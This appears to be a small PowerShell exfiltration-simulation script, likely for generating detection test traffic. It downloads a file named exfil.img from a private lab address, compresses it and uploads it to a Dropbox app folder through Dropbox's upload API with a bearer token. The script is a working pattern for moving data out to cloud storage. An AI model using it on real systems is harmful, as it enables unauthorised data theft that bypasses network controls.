$SourceFilePath="C:\Users\Administrator\Downloads\exfil.zip"

#LR-ToDo: Need to set it up so the token is read from an ini file
#Need to put token in the double qoutes
$authorization = "Bearer " + ""

$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"

$headers.Add("Authorization", $authorization)

$headers.Add("Dropbox-API-Arg", '{"path":"/Apps/LR-DE/exfil.zip", "mode": "add", "autorename": true, "mute": false}')

$headers.Add("Content-Type", 'application/octet-stream')


#Downloads file from server
Invoke-WebRequest -Uri "http://192.168.100.115/exfil.img" -OutFile "C:\Users\Administrator\Downloads\exfil.img"

#Compresses file that is downloaded
Compress-Archive -LiteralPath 'C:\Users\Administrator\Downloads\exfil.img' -DestinationPath 'C:\Users\Administrator\Downloads\exfil.zip'

#Uploads file to dropbox via api
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers